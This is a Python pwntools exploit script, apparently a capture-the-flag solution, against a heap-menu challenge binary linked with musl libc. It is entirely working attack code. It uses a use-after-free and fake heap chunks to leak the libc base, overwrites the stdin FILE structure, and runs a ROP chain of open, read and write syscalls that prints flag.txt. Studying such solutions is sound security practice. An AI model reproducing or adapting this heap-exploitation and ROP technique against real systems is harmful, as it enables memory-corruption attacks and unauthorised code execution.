#!/usr/bin/env python3

from pwn import *

exe = ELF('./chall')
libc = ELF('./lib/libc.musl-x86_64.so.1')

context.binary = exe

host = args.HOST or 'localhost'
port = args.PORT or 31178

def local():
  return process(['chroot', '.', '/chall'], env={}) # pepega

def conn():
  if args.LOCAL:
    return local()
  else:
    return remote(host, port)

def debug():
  if args.LOCAL:
    gdb.attach(r, gdbscript=gdbscript)
    pause()

gdbscript = f'''
file {exe.path}
tele &slots 16
'''

r = conn()

# good luck pwning :)

def malloc(idx, size, content):
  r.sendlineafter(b'choice? ', b'1')
  r.sendlineafter(b'idx? ', str(idx).encode('utf-8'))
  r.sendlineafter(b'size? ', str(size).encode('utf-8'))
  r.sendafter(b'content? ', content)

def free(idx):
  r.sendlineafter(b'choice? ', b'2')
  r.sendlineafter(b'idx? ', str(idx).encode('utf-8'))

def view(idx):
  r.sendlineafter(b'choice? ', b'3')
  r.sendlineafter(b'idx? ', str(idx).encode('utf-8'))

malloc(0, 1, b'a')
malloc(1, 1, b'a')
malloc(1, 1, b'a')
free(1)
free(0)

# set length to 100 to leak a bunch of stuff
malloc(2, 64, p64(100))
view(1)
libc.address = u64(r.recv(8)) - 0x95610
log.info(f'libc 0x{libc.address:x}')
log.info(f'stdin 0x{libc.sym["__stdin_FILE"]:x}')

# point buf at fake chunk
fake_add = libc.address + 0x956b0
log.info(f'fake chunk 0x{fake_add:x}')
free(2)
malloc(2, 64, p64(0) + p64(fake_add))

# add some free chunks
malloc(8, 16, b'a')
malloc(9, 16, b'a')
free(8)

# make fake chunks
big = flat([0x21, 0x21, 0, 0, 0x21, 0xa1, [0] * 18, 0xa1, 0x21, 0, 0])
malloc(3, 0xf0, big)
# free fake chunk
free(1)

# uaf fake chunk
free(3)
uaf = flat([0x21, 0x21, 0, 0, 0x21, 0xa0, [libc.sym['__stdin_FILE'] - 0x20] * 2])
malloc(3, 0xf0, uaf)

# write addresses before stdin
malloc(4, 128, b'asdf')

# do again to write to stdin
malloc(4, 1, b'a')
malloc(5, 1, b'a')
malloc(5, 1, b'a')
free(5)
free(4)
fake_add = libc.address + 0x95890
log.info(f'fake chunk 0x{fake_add:x}')
malloc(6, 64, p64(0) + p64(fake_add))
malloc(14, 16, b'a')
malloc(15, 16, b'a')
free(14)
big = flat([0x21, 0x21, 0, 0, 0x21, 0x221, [0] * 66, 0x221, 0x21, 0, 0])
malloc(7, 0x400, big)
free(5)
free(7)
uaf = flat([0x21, 0x21, 0, 0, 0x21, 0x220, libc.sym['__stdin_FILE'] - 0x20, libc.address + 0x92c00])
malloc(7, 0x400, uaf)
malloc(8, 512, b'a')

# overwrite stdin with ROP chain
based_gadget = libc.address + 0x449d6
ret = libc.address + 0x15255
rax = libc.address + 0x152ed
rdi = libc.address + 0x152cb
rsi = libc.address + 0x191da
rdx = libc.address + 0x15981
syscall = libc.address + 0x1f863

payload = flat([b'flag.txt', 0, 0x49, 0, 0, libc.sym['__stdio_close'], 0, 0, libc.sym['__stdin_FILE'] + 0x50, ret, 0, based_gadget, [
  rdi, libc.sym['__stdin_FILE'] - 0x10, rsi, 0, rdx, 0, rax, 0, rax, constants.SYS_open, syscall,
  rdi, 3, rsi, libc.sym['__stdin_FILE'], rdx, 128, rax, constants.SYS_read, syscall,
  rdi, constants.STDOUT_FILENO, rsi, libc.sym['__stdin_FILE'], rdx, 128, rax, constants.SYS_write, syscall,
]])
malloc(8, 512, payload)
# debug()
r.sendlineafter(b'choice? ', b'4')

r.stream()
